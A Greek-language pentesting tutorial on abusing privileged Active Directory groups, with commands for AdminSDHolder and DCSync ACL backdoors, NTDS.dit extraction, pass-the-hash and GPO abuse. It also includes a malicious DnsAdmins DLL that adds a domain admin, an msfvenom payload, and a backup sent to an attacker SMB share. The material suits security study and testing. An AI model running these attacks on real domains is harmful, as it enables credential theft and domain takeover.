# Προνομιούχες ομάδες

{{#include ../../banners/hacktricks-training.md}}

## Γνωστές ομάδες με δικαιώματα διαχείρισης

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Αυτή η ομάδα έχει τη δυνατότητα να δημιουργεί λογαριασμούς και ομάδες που δεν είναι διαχειριστές του domain. Επιπλέον, επιτρέπει την τοπική σύνδεση στο Domain Controller (DC).

Για να εντοπιστούν τα μέλη αυτής της ομάδας, εκτελείται η ακόλουθη εντολή:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Επιτρέπεται η προσθήκη νέων χρηστών, καθώς και η τοπική σύνδεση στον DC.<sup>[[1]](#references)</sup>

Μια υπό όρους διαδρομή από τη διαχείριση λογαριασμών έως την πρόσβαση ως τοπικός διαχειριστής είναι μια **συνηθισμένη ομάδα στην οποία έχει ανατεθεί δικαίωμα ανάγνωσης του κωδικού πρόσβασης LAPS ενός υπολογιστή**. Ελέγξτε τα πραγματικά δικαιώματα εγγραφής μελών στη συγκεκριμένη ομάδα, αν είναι προστατευμένη και αν ένας νέος ή ελεγχόμενος λογαριασμός μπορεί όντως να γίνει μέλος της. Ανανεώστε το token του λογαριασμού πριν ελέγξετε το δικαίωμα ανάγνωσης LAPS στον υπολογιστή-στόχο. Για το κρυπτογραφημένο Windows LAPS, το δικαίωμα ανάγνωσης στον κατάλογο και η εξουσιοδότηση αποκρυπτογράφησης του κωδικού πρόσβασης είναι ξεχωριστές απαιτήσεις· η συμμετοχή σε ομάδα ή η ιδιότητα μέλους της ομάδας Account Operators δεν εξασφαλίζει από μόνη της καμία από τις δύο. Δείτε το [εύρος αρμοδιοτήτων της ομάδας Account Operators από τη Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) και την [ανάθεση δικαιωμάτων Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## Ομάδα AdminSDHolder

Η Access Control List (ACL) της ομάδας **AdminSDHolder** είναι κρίσιμη, καθώς ορίζει τα δικαιώματα για όλες τις «προστατευμένες ομάδες» στο Active Directory, συμπεριλαμβανομένων των ομάδων με υψηλά προνόμια. Αυτός ο μηχανισμός διασφαλίζει την ασφάλεια αυτών των ομάδων, αποτρέποντας μη εξουσιοδοτημένες τροποποιήσεις.

Ένας attacker θα μπορούσε να το εκμεταλλευτεί τροποποιώντας την ACL της ομάδας **AdminSDHolder** και παραχωρώντας πλήρη δικαιώματα σε έναν τυπικό χρήστη. Αυτό θα έδινε ουσιαστικά στον χρήστη πλήρη έλεγχο όλων των προστατευμένων ομάδων. Αν τα δικαιώματα αυτού του χρήστη τροποποιηθούν ή καταργηθούν, θα αποκατασταθούν αυτόματα μέσα σε μία ώρα, λόγω του σχεδιασμού του συστήματος.<sup>[[14]](#references)</sup>

Η πρόσφατη τεκμηρίωση των Windows Server εξακολουθεί να αντιμετωπίζει αρκετές ενσωματωμένες ομάδες χειριστών ως **προστατευμένα** αντικείμενα (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` κ.λπ.). Η διεργασία **SDProp** εκτελείται στον **PDC Emulator** κάθε 60 λεπτά από προεπιλογή, ορίζει `adminCount=1` και απενεργοποιεί την κληρονόμηση στα προστατευμένα αντικείμενα. Αυτό είναι χρήσιμο τόσο για persistence όσο και για τον εντοπισμό παρωχημένων προνομιούχων χρηστών που αφαιρέθηκαν από μια προστατευμένη ομάδα, αλλά εξακολουθούν να έχουν ACL χωρίς κληρονόμηση.<sup>[[12]](#references)</sup>

Οι εντολές για τον έλεγχο των μελών και την τροποποίηση των δικαιωμάτων περιλαμβάνουν:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Ένα script είναι διαθέσιμο για την επιτάχυνση της διαδικασίας επαναφοράς: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Για περισσότερες λεπτομέρειες, επισκεφθείτε το [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Η ορατότητα των διαγραμμένων αντικειμένων ελέγχεται από τα πραγματικά δικαιώματα καταλόγου· το όνομα μιας ομάδας από μόνο του δεν αποδεικνύει ότι η τρέχουσα ταυτότητα μπορεί να παραθέσει ή να επαναφέρει ένα αντικείμενο. Το AD Recycle Bin πρέπει να ήταν ενεργοποιημένο πριν από τη διαγραφή για πλήρη επαναφορά, ενώ για την επαναφορά απαιτούνται επίσης δικαιώματα Reanimate-Tombstones στη ρίζα του naming context, δικαιώματα μετονομασίας και CREATE_CHILD στο κοντέινερ προορισμού. Οι οδηγίες της [Microsoft για το Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) και οι [κανόνες εξουσιοδότησης για την αναίρεση διαγραφής](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) διακρίνουν αυτές τις προϋποθέσεις. Μια εξουσιοδοτημένη ταυτότητα με πρόσβαση ανάγνωσης σε διαγραμμένα αντικείμενα μπορεί να επιθεωρήσει εγγραφές που ενδέχεται να αποκαλύπτουν ευαίσθητες πληροφορίες:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Αυτό είναι χρήσιμο για **την ανάκτηση προηγούμενων διαδρομών απόκτησης δικαιωμάτων**. Τα διαγραμμένα αντικείμενα μπορεί να εξακολουθούν να αποκαλύπτουν `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, παλιά SPNs ή το DN μιας διαγραμμένης προνομιούχας ομάδας, την οποία μπορεί αργότερα να επαναφέρει κάποιος άλλος χειριστής.

Τα χαρακτηριστικά που ορίζονται από εφαρμογές μπορεί επίσης να διατηρούν παλιό υλικό διαπιστευτηρίων όσο ένα αντικείμενο παραμένει σε διαγραμμένη κατάσταση. Αντιμετωπίστε το ως ξεχωριστό στοιχείο προς διερεύνηση: η τρέχουσα ταυτότητα πρέπει να έχει δικαίωμα απαρίθμησης του διαγραμμένου αντικειμένου **και** ανάγνωσης αυτού του χαρακτηριστικού, η τιμή πρέπει να είναι αξιοποιήσιμο διαπιστευτήριο και ένας ενεργός ακόμη principal πρέπει να το αποδέχεται. Η συμμετοχή σε ομάδα ή μόνο το όνομα ενός διαγραμμένου λογαριασμού δεν αποδεικνύει κανένα από αυτά τα βήματα· αποφύγετε να εμφανίζετε τιμές διαπιστευτηρίων κατά τη συνήθη απαρίθμηση. Η [τεκμηρίωση της Microsoft για τον Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) περιγράφει τη διατήρηση χαρακτηριστικών μετά τη διαγραφή.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Πρόσβαση στον Domain Controller

Η πρόσβαση σε αρχεία στον DC είναι περιορισμένη, εκτός αν ο χρήστης ανήκει στην ομάδα `Server Operators`, κάτι που αλλάζει το επίπεδο πρόσβασης.

### Privilege Escalation

Με τη χρήση των `PsService` ή `sc` από το Sysinternals, μπορεί κανείς να επιθεωρήσει και να τροποποιήσει τα δικαιώματα υπηρεσιών. Για παράδειγμα, η ομάδα `Server Operators` έχει πλήρη έλεγχο σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και την κλιμάκωση προνομίων:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Αυτή η εντολή αποκαλύπτει ότι οι `Server Operators` έχουν πλήρη πρόσβαση, επιτρέποντας τη χειραγώγηση υπηρεσιών για την απόκτηση αυξημένων προνομίων.

## Backup Operators

Η συμμετοχή στην ομάδα `Backup Operators` μπορεί να παρέχει τα `SeBackupPrivilege` και `SeRestorePrivilege` σε έναν host, ανάλογα με την τοπική πολιτική του και τη συνεδρία σύνδεσης. Ελέγξτε το **effective token της διεργασίας που εκτελεί τις εντολές** με `whoami /groups` και `whoami /priv`: η συμμετοχή από μόνη της δεν αποδεικνύει ότι το `SeBackupPrivilege` υπάρχει και είναι ενεργοποιημένο. Αν το προνόμιο υπάρχει αλλά είναι απενεργοποιημένο, μπορεί να ενεργοποιηθεί σε αυτό το token· αν απουσιάζει ή έχει αφαιρεθεί, αυτές οι λειτουργίες backup δεν μπορούν να το χρησιμοποιήσουν. Το `SeBackupPrivilege` επιτρέπει προστατευμένες **αναγνώσεις** μέσω API που υποστηρίζουν backup (για παράδειγμα, `FILE_FLAG_BACKUP_SEMANTICS` ή `robocopy /B`)· το `SeRestorePrivilege` είναι ξεχωριστό προνόμιο για λειτουργίες επαναφοράς/εγγραφής. Οι συνηθισμένες καταχωρίσεις καταλόγων και αντιγραφές δεν χρησιμοποιούν απαραίτητα backup semantics.<sup>[[1]](#references)</sup>

Για να εμφανίσετε τα μέλη της ομάδας, εκτελέστε:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Τοπική επίθεση

Σε έναν host όπου το effective token έχει `SeBackupPrivilege`, η ακόλουθη backup-aware αντιγραφή μπορεί να διαβάσει ένα προστατευμένο αρχείο:

1. Εισαγωγή των απαραίτητων βιβλιοθηκών:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Αν το προνόμιο υπάρχει αλλά είναι απενεργοποιημένο, ενεργοποιήστε το και επαληθεύστε την κατάστασή του σε αυτήν τη διεργασία:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Αντιγράψτε ένα αρχείο από έναν περιορισμένης πρόσβασης κατάλογο, για παράδειγμα:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### Επίθεση AD

Το `NTDS.dit` είναι η βάση δεδομένων του Active Directory σε έναν **domain controller (DC)**. Αυτή η μέθοδος απαιτεί κατάλληλο token στον DC και πρόσβαση στον τόμο που περιέχει τη βάση δεδομένων· η συμμετοχή στην ομάδα Backup Operators σε άλλο σημείο δεν παρέχει πρόσβαση σε συγκεκριμένο DC. Μια ενεργή βάση δεδομένων είναι συνήθως κλειδωμένη, επομένως χρησιμοποιήστε ένα προσβάσιμο shadow copy ή άλλη δυνατότητα δημιουργίας αντιγράφων ασφαλείας πριν την αντιγράψετε. Η δημιουργία ή έκθεση ενός shadow copy εξαρτάται επίσης από τη διαμόρφωση VSS του host και τα δικαιώματα του καλούντος. Το παρακάτω παράδειγμα υποθέτει ότι ο DC αποθηκεύει το `NTDS.dit` στη μονάδα `C:`, στη διαδρομή `\Windows\NTDS`· προσαρμόστε τον τόμο και τη διαδρομή αν αυτό δεν ισχύει.

#### Χρήση του diskshadow.exe

1. Αν επιτρέπεται, δημιουργήστε και εκθέστε ένα shadow copy της μονάδας `C:` του DC ως `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Αντιγράψτε το `NTDS.dit` από το shadow copy:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Εναλλακτικά, χρησιμοποιήστε το `robocopy` για την αντιγραφή αρχείων:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Αποθηκεύστε το hive `SYSTEM` του DC για offline εξαγωγή. Το `SAM` είναι η τοπική βάση δεδομένων λογαριασμών στα συστήματα-μέλη· το hive `SAM` ενός DC δεν υποκαθιστά το `NTDS.dit` ούτε αποτελεί πηγή του hash του domain Administrator:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Μεταφέρετε τα `ntds.dit` και `SYSTEM.SAV` στον host ανάλυσης και εξαγάγετε τα hashes λογαριασμών του domain. Ένα αποθηκευμένο hive `SAM` από ένα member system, μαζί με το αντίστοιχο hive `SYSTEM`, δίνει hashes τοπικών λογαριασμών αντί για αυτά:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Αν ανακτήθηκε hash ενός **domain** Administrator από το `NTDS.dit`, μπορεί να δοκιμαστεί για έλεγχο ταυτότητας στο domain. Ένα τοπικό hash Administrator από το `SAM.SAV` είναι διαφορετικό διαπιστευτήριο και δεν παρέχει έλεγχο ταυτότητας ως Administrator του domain.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Χρήση του wbadmin.exe

1. Ρυθμίστε ένα σύστημα αρχείων NTFS για τον SMB server στο μηχάνημα του επιτιθέμενου και αποθηκεύστε προσωρινά τα διαπιστευτήρια SMB στο μηχάνημα-στόχο.
2. Χρησιμοποιήστε το `wbadmin.exe` για δημιουργία αντιγράφου ασφαλείας του συστήματος και εξαγωγή του `NTDS.dit`:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Για μια πρακτική επίδειξη, δείτε το [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Τα μέλη της ομάδας **DnsAdmins** μπορούν να εκμεταλλευτούν τα προνόμιά τους για να φορτώσουν ένα αυθαίρετο DLL με δικαιώματα SYSTEM σε έναν διακομιστή DNS, ο οποίος συχνά φιλοξενείται σε Domain Controllers. Αυτή η δυνατότητα επιτρέπει σημαντικές δυνατότητες εκμετάλλευσης.

Για να εμφανίσετε τα μέλη της ομάδας DnsAdmins, χρησιμοποιήστε:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Εκτέλεση αυθαίρετου DLL (CVE‑2021‑40469)

> [!NOTE]
> Αυτή η ευπάθεια επιτρέπει την εκτέλεση αυθαίρετου κώδικα με δικαιώματα SYSTEM στην υπηρεσία DNS (συνήθως μέσα στους DCs). Αυτό το ζήτημα διορθώθηκε το 2021.

Τα μέλη μπορούν να κάνουν τον DNS server να φορτώσει ένα αυθαίρετο DLL (είτε τοπικά είτε από απομακρυσμένο share) χρησιμοποιώντας εντολές όπως οι εξής:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Η επανεκκίνηση της υπηρεσίας DNS (η οποία ενδέχεται να απαιτεί πρόσθετα δικαιώματα) είναι απαραίτητη για να φορτωθεί το DLL:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Για περισσότερες λεπτομέρειες σχετικά με αυτό το attack vector, ανατρέξτε στο ired.team.

#### Mimilib.dll

Είναι επίσης δυνατό να χρησιμοποιηθεί το mimilib.dll για εκτέλεση εντολών, τροποποιώντας το ώστε να εκτελεί συγκεκριμένες εντολές ή reverse shells. [Δείτε αυτήν την ανάρτηση](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) για περισσότερες πληροφορίες.<sup>[[15]](#references)</sup>

### WPAD Record για MitM

Οι DNSAdmins μπορούν να χειριστούν εγγραφές DNS για να πραγματοποιήσουν επιθέσεις Man-in-the-Middle (MitM), δημιουργώντας μια εγγραφή WPAD αφού απενεργοποιήσουν τη global query block list. Εργαλεία όπως τα Responder ή Inveigh μπορούν να χρησιμοποιηθούν για spoofing και capture της κίνησης δικτύου.

### Event Log Readers
Τα μέλη μπορούν να έχουν πρόσβαση στα event logs και ενδεχομένως να εντοπίσουν ευαίσθητες πληροφορίες, όπως κωδικούς πρόσβασης σε απλό κείμενο ή λεπτομέρειες εκτέλεσης εντολών:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Δικαιώματα Exchange Windows

Αυτή η ομάδα μπορεί να τροποποιήσει τα DACL στο αντικείμενο του domain, αποκτώντας ενδεχομένως προνόμια DCSync. Οι τεχνικές κλιμάκωσης προνομίων που εκμεταλλεύονται αυτή την ομάδα περιγράφονται λεπτομερώς στο GitHub repo Exchange-AD-Privesc.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Αν μπορείτε να ενεργείτε ως μέλος αυτής της ομάδας, η κλασική κατάχρηση είναι να παραχωρήσετε σε μια οντότητα ασφαλείας που ελέγχει ο εισβολέας τα δικαιώματα αναπαραγωγής που απαιτούνται για το [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Ιστορικά, το **PrivExchange** συνδύαζε πρόσβαση σε mailbox, εξαναγκασμό του Exchange σε authentication και LDAP relay, για να αποκτήσει αυτό το ίδιο primitive. Ακόμη κι όταν αυτή η διαδρομή relay μετριάζεται, η άμεση συμμετοχή στην ομάδα `Exchange Windows Permissions` ή ο έλεγχος ενός Exchange server παραμένουν πολύτιμη διαδρομή για την απόκτηση δικαιωμάτων domain replication.

## Hyper-V Administrators

Οι Hyper-V Administrators έχουν πλήρη πρόσβαση στο Hyper-V, η οποία μπορεί να αξιοποιηθεί για την απόκτηση ελέγχου σε εικονικοποιημένους Domain Controllers. Σε αυτό περιλαμβάνεται η κλωνοποίηση ενεργών DC και η εξαγωγή NTLM hashes από το αρχείο NTDS.dit.

### Παράδειγμα εκμετάλλευσης

Η πρακτική κατάχρηση συνήθως βασίζεται σε **offline πρόσβαση στους δίσκους/checkpoints των DC** και όχι σε παλιές τεχνικές LPE στο επίπεδο του host. Με πρόσβαση στον Hyper-V host, ένας operator μπορεί να δημιουργήσει checkpoint ή να εξαγάγει έναν εικονικοποιημένο Domain Controller, να προσαρτήσει το VHDX και να εξαγάγει τα `NTDS.dit`, `SYSTEM` και άλλα secrets, χωρίς να πειράξει το LSASS μέσα στο guest:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Από εκεί, επαναχρησιμοποιήστε τη ροή εργασίας `Backup Operators` για να αντιγράψετε το `Windows\NTDS\ntds.dit` και τα registry hives εκτός σύνδεσης. Σχετική ροή εργασίας για αρχεία backup:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Αυτή η ομάδα επιτρέπει στα μέλη της να δημιουργούν Group Policies στο domain. Ωστόσο, τα μέλη της δεν μπορούν να εφαρμόζουν group policies σε χρήστες ή ομάδες ούτε να επεξεργάζονται υπάρχοντα GPO.

Η σημαντική λεπτομέρεια είναι ότι **ο δημιουργός γίνεται ιδιοκτήτης του νέου GPO** και συνήθως αποκτά αρκετά δικαιώματα ώστε να το επεξεργαστεί στη συνέχεια. Αυτό σημαίνει ότι αυτή η ομάδα παρουσιάζει ενδιαφέρον όταν μπορείτε είτε να:

- δημιουργήσετε ένα κακόβουλο GPO και να πείσετε έναν admin να το συνδέσει με ένα OU/domain-στόχο
- επεξεργαστείτε ένα GPO που δημιουργήσατε και είναι ήδη συνδεδεμένο σε κάποιο χρήσιμο σημείο
- καταχραστείτε κάποιο άλλο εκχωρημένο δικαίωμα που σας επιτρέπει να συνδέετε GPO, ενώ αυτή η ομάδα σας δίνει τη δυνατότητα επεξεργασίας

Στην πράξη, η κατάχρηση συνήθως περιλαμβάνει την προσθήκη μιας **Immediate Task**, ενός **startup script**, αλλαγής στη **συμμετοχή σε local admin** ή στην **εκχώρηση δικαιωμάτων χρήστη** μέσω αρχείων πολιτικής που υποστηρίζονται από το SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Αν επεξεργάζεστε χειροκίνητα το GPO μέσω του `SYSVOL`, θυμηθείτε ότι η αλλαγή από μόνη της δεν αρκεί: πρέπει επίσης να ενημερωθούν τα `versionNumber`, `GPT.ini` και, μερικές φορές, το `gPCMachineExtensionNames`, διαφορετικά οι clients θα αγνοήσουν την ανανέωση της πολιτικής.<sup>[[9]](#references)</sup>

## Διαχείριση οργανισμού

Σε περιβάλλοντα όπου έχει αναπτυχθεί το **Microsoft Exchange**, μια ειδική ομάδα, γνωστή ως **Organization Management**, διαθέτει σημαντικές δυνατότητες. Αυτή η ομάδα έχει δικαιώματα **πρόσβασης στα γραμματοκιβώτια όλων των χρηστών του domain** και διατηρεί **πλήρη έλεγχο της Organizational Unit (OU) 'Microsoft Exchange Security Groups'**. Αυτός ο έλεγχος περιλαμβάνει την ομάδα **`Exchange Windows Permissions`**, η οποία μπορεί να αξιοποιηθεί για κλιμάκωση προνομίων.

### Εκμετάλλευση προνομίων και εντολές

#### Print Operators

Τα μέλη της ομάδας **Print Operators** διαθέτουν διάφορα προνόμια, όπως το **`SeLoadDriverPrivilege`**, το οποίο τους επιτρέπει να **συνδέονται τοπικά σε έναν Domain Controller**, να τον τερματίζουν και να διαχειρίζονται εκτυπωτές. Για την εκμετάλλευση αυτών των προνομίων, ιδίως αν το **`SeLoadDriverPrivilege`** δεν είναι ορατό σε μη elevated περιβάλλον, είναι απαραίτητη η παράκαμψη του User Account Control (UAC).<sup>[[1]](#references)</sup>

Για να εμφανίσετε τα μέλη αυτής της ομάδας, χρησιμοποιείται η ακόλουθη εντολή PowerShell:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Στους Domain Controllers, αυτή η ομάδα είναι επικίνδυνη, επειδή η προεπιλεγμένη πολιτική Domain Controller εκχωρεί το **`SeLoadDriverPrivilege`** στους `Print Operators`. Αν αποκτήσετε elevated token για ένα μέλος αυτής της ομάδας, μπορείτε να ενεργοποιήσετε το privilege και να φορτώσετε έναν υπογεγραμμένο αλλά ευάλωτο driver, αποκτώντας πρόσβαση σε επίπεδο kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Για λεπτομέρειες σχετικά με τον χειρισμό token, δείτε τα [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Στα μέλη αυτής της ομάδας παρέχεται πρόσβαση σε PC μέσω του Remote Desktop Protocol (RDP). Για την απαρίθμηση αυτών των μελών, υπάρχουν διαθέσιμες εντολές PowerShell:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Περισσότερες πληροφορίες σχετικά με την εκμετάλλευση του RDP μπορείτε να βρείτε σε ειδικούς πόρους για pentesting.

#### Remote Management Users

Τα μέλη μπορούν να έχουν πρόσβαση σε υπολογιστές μέσω του **Windows Remote Management (WinRM)**. Η απαρίθμηση αυτών των μελών γίνεται μέσω:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Για τεχνικές εκμετάλλευσης που σχετίζονται με το **WinRM**, πρέπει να συμβουλευτείτε τη σχετική τεκμηρίωση.

#### Server Operators

Αυτή η ομάδα έχει δικαιώματα για την εκτέλεση διαφόρων ρυθμίσεων σε Domain Controllers, συμπεριλαμβανομένων των δικαιωμάτων δημιουργίας αντιγράφων ασφαλείας και επαναφοράς, αλλαγής της ώρας του συστήματος και τερματισμού λειτουργίας του συστήματος.<sup>[[1]](#references)</sup> Για την απαρίθμηση των μελών, δίνεται η εξής εντολή:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Στους Domain Controllers, οι `Server Operators` συνήθως κληρονομούν αρκετά δικαιώματα ώστε να **αναδιαμορφώνουν ή να εκκινούν/διακόπτουν υπηρεσίες**, ενώ λαμβάνουν επίσης τα `SeBackupPrivilege`/`SeRestorePrivilege` μέσω της προεπιλεγμένης πολιτικής DC. Στην πράξη, αυτό τους καθιστά γέφυρα μεταξύ της **κατάχρησης ελέγχου υπηρεσιών** και της **εξαγωγής NTDS**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Η αδυναμία απαρίθμησης των υπηρεσιών δεν αποκλείει την πρόσβαση σε μια **γνωστή υπηρεσία**. Το Service Control Manager ελέγχει ξεχωριστά το `SC_MANAGER_ENUMERATE_SERVICE` για την απαρίθμηση και το `SC_MANAGER_CONNECT`· το άνοιγμα μιας κατονομασμένης υπηρεσίας ελέγχει τα δικά του δικαιώματα, μεταξύ των οποίων τα `SERVICE_CHANGE_CONFIG` και `SERVICE_START`. Ελέγξτε το effective token και το ACL της συγκεκριμένης υπηρεσίας, ακόμη κι όταν αποτυγχάνει μια γενική εντολή `sc.exe query`. Τα δικαιώματα αλλαγής διαμόρφωσης από μόνα τους αποτελούν μόνο υποψήφια δυνατότητα: η ταυτότητα της υπηρεσίας, τα δικαιώματα εκκίνησης/διακοπής και η ύπαρξη ενός αξιοποιήσιμου trigger εξακολουθούν να καθορίζουν αν είναι εφικτή μια μετάβαση σε υψηλότερα προνόμια. Δείτε την [αναφορά της Microsoft για τα δικαιώματα πρόσβασης υπηρεσιών](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Αν το ACL μιας υπηρεσίας παρέχει σε αυτήν την ομάδα δικαιώματα αλλαγής/εκκίνησης, ορίστε στην υπηρεσία μια αυθαίρετη εντολή, εκκινήστε την ως `LocalSystem` και, στη συνέχεια, επαναφέρετε το αρχικό `binPath`. Αν ο έλεγχος υπηρεσιών είναι περιορισμένος, χρησιμοποιήστε εναλλακτικά τις παραπάνω τεχνικές `Backup Operators` για να αντιγράψετε το `NTDS.dit`.

## References

- [1] [ired.team – Προνομιούχοι λογαριασμοί και δικαιώματα token](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Κατάχρηση του SeLoadDriverPrivilege για κλιμάκωση προνομίων](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Κατάχρηση δικαιωμάτων GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Κατάχρηση GPO, Μέρος 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Οδηγός red team για GPO και OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
